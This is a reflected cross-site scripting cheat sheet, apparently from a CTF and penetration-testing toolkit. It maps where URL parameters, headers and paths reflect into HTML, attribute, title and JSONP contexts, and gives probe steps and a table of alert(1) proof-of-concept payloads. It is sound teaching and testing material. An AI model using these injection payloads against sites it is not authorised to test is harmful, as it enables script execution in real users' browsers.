# Reflected XSS — the URL-carried variant

The payload rides in a URL parameter and reflects straight into the
response. Reflected XSS needs a victim to click your link — for
admin bots, the crafted URL IS the delivery.

---

## 1. The reflection map — where the param lands

```text
GET /search?q=<img src=x onerror=alert(1)>
→ <div>Results for: <img src=x onerror=alert(1)></div>
   — the value reflects between tags — HTML context

GET /u?name=x"><img src=x onerror=alert(1)>
→ <input value="x"><img src=x onerror=alert(1)>">
   — the value reflects inside an attribute — attr context

GET /api?callback=alert(1)
→ alert(1)({"data":...})
   — JSONP reflection — the param wraps the JSON — JS context
```

The first probe: `XSS_PROBE_<rand>` into the param — grep the RAW
response to find where it landed and whether it's encoded.

---

## 2. The param-families — where reflected inputs live

```text
?q /search /query /keyword      — search params
?error /msg /message             — error/message echoes
?name /user /username            — name fields
?id /uid /pid                     — ids (often numeric-checked)
?callback /cb /jsonp              — JSONP endpoints
?redirect /url /next /return      — redirect params (different class)
?return_url /continue /dest       — nav params
?file /path /page                 — file-path params (LFI-adjacent)
?lang /locale                     — locale params (cookie-stored later)
?theme /color /style              — display prefs
?filter /sort /order /by          — query-shape params
?page /offset /limit              — pagination
```

The search/error/name/callback params are the classic reflectors;
id/sort/order params are often numeric-validated.

---

## 3. The encode-step — what the param survives

```text
?q=<img src=x onerror=alert(1)>
   — raw — server may or may not decode; browsers %-encode < > "
?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
   — fully pct-encoded — always decode-safe
?q=%253Cimg...%253E
   — DOUBLE-encoded — lands as %3Cimg... — only helps when the
     app decodes twice
```

The `&` trap — `&` inside your payload value splits the param:

```text
?q=<img src=x onerror=alert(1)&debug=1>
   — the &debug=1 ends your q value — encode it: %26
?q=<img src=x onerror=alert(1)%26debug=1>
   — the payload now contains a literal & — usually fine
```

The `#` trap — `#` truncates the query at the fragment:

```text
?q=<img src=x onerror=alert(1)#x>
   — everything after # is fragment, never sent — truncate-safe
?q=%23x<img src=x onerror=alert(1)>
   — %23 IS a literal # inside the value — use it
```

---

## 4. The header/body reflections — non-param carriers

```text
Referer: https://me/?<img src=x onerror=alert(1)>
   → page shows "You came from: <referer>" — attr/body context

User-Agent: <img src=x onerror=alert(1)>
   → admin log-viewer renders it — blind/stored hybrid

Cookie: pref=<img src=x onerror=alert(1)>
   → page reads the cookie into the DOM — stored-ish

X-Forwarded-For: <img src=x onerror=alert(1)>
   → admin IP-log page — blind via header

Content-Type / Accept / any header the app echoes
```

Header reflections are reflected-XSS-in-disguise — same mechanics,
different carrier. `tools/web/http_probe.py --headers` injects
arbitrary headers.

---

## 5. The path-carried reflections — `/path/<payload>`

```text
GET /user/<img src=x onerror=alert(1)>
→ 404: path /user/<img src=x onerror=alert(1)> not found
   — the 404 page echoes the path — HTML context

GET /api/v1/<svg onload=alert(1)>
→ {"error":"unknown endpoint: <svg onload=alert(1)>"}
   — JSON response — the content-type matters:
   → if Content-Type: application/json — the browser renders
     as text — dead for HTML-XSS BUT the JS is still in a page if
     the SPA reads the error string into innerHTML
   → if Content-Type: text/html — the error page parses it
```

`Content-Type` of the reflecting response is the gate —
`text/html`/`application/xhtml+xml` parse; `application/json`/
`text/plain` render as text (dead for tag-XSS, alive for DOM-XSS
via an app that reads the string).

---

## 6. The multi-reflect — one param in two spots

```text
?q=x → <title>x</title> AND <div>x</div>
   — one param, two contexts — need a polyglot
?q="><img src=x onerror=alert(1)>
   → <title>"><img...></title> <div>"><img...></div>
   → the "> doesn't hurt title-RCDATA? it DOES — title closes
     on </title> only — your img lands inside the title → dead
   → the correct polyglot: </title><img src=x onerror=alert(1)>
```

When a param lands in `<title>` + body — `</title>` prefix then
the tag. `polyglots.md` §6 has the full context-pair table.

---

## 7. The confirm protocol

```text
1. q=XSS_PROBE_<rand>           — is it reflected at all?
2. q=<b>XSS_PROBE_</b>          — is HTML parsed?
3. q=<img src=x onerror="XSS_PROBE_">  — does the handler fire?
4. q="><img src=x onerror="XSS_PROBE_"> — the attr-escape check
```

A reflection that shows `&lt;b&gt;` = entity-encoded (skip this
context or find the un-encoded one). A reflection inside an
attribute = `">` escape needed. A reflection in `<title>` =
`</title>` escape.

---

## 8. The reflected→self trap — reflected on YOUR page only

```text
?q=<img onerror=alert(1)> → fires when YOU visit it
   — still real XSS IF the bot clicks your link
   — worthless if no victim ever clicks the crafted URL
```

Reflected XSS IS real XSS — the URL IS the delivery. For CTF,
submit the crafted URL to the bot. For pentest, the social-
engineering requirement is the finding's limitation, not a
disqualifier.

---

## 9. The DOM-reflected hybrid — param → JS → DOM

```javascript
// the param lands in JS first:
var q = new URLSearchParams(location.search).get('q');
el.innerHTML = q;
   → ?q=<img src=x onerror=alert(1)> — the DOM sink route
   → the RAW response doesn't contain the value — it's a DOM XSS
     with a reflected SOURCE — dom-xss.md
```

The response won't contain your payload — the JS reads it from the
URL. Different detection path (bundle_mine the sink, not the
response-grep).

---

## 10. The reflected-XSS cheatsheet

| Reflected context | Payload |
|---|---|
| between tags | `<img src=x onerror=alert(1)>` |
| `"` attr | `"><img src=x onerror=alert(1)>` |
| `'` attr | `'><svg onload=alert(1)>` |
| `href` | `javascript:alert(1)` |
| `<title>` | `</title><img src=x onerror=alert(1)>` |
| `<textarea>` | `</textarea><svg onload=alert(1)>` |
| JS string | `";alert(1);//` |
| JSONP callback | `alert(1)` (the callback name IS the code) |
| error-page path | `/<img src=x onerror=alert(1)>` in path |
| param in two spots | `polyglots.md` §6 |
